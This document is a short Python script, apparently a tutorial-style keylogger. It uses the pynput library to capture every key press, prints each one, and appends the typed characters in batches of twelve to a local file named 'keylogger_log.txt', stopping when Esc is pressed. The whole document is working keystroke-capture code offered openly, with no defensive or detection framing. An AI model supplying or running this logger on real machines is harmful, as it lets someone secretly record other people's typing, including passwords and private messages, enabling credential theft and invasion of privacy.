# Here Listener will listen for events.
from pynput.keyboard import Key, Listener 

count = 0
keys = []

# collecting pressed keys.
def on_press(key):
    global count, keys
    # we will write keys in file after certain amount of keys are pressed.
    keys.append(key)
    count += 1
    print('{} pressed'.format(key))
    # resetting after 12 keys are pressed 
    if count >= 12:
        write_file(keys)
        count = 0
        keys = []

# writing keys pressed in a file. 
def write_file(keys):
    with open('keylogger_log.txt', 'a') as file:
        for key in keys:
            #detecting spaces.
            if key == Key.space:
                file.write('\n')

            #avoiding other keys like ctrl, alt, shift.
            elif key.__class__.__name__ != 'Key':
                n_key = str(key).replace("'", "")
                file.write(n_key)

# when esc key is pressed it will break loop of listening for keys.
def on_release(key):
    if key == Key.esc:
        return False

# it will keep running loop collecting events until on_release.
with Listener(on_press= on_press, on_release= on_release) as listener:
    listener.join()
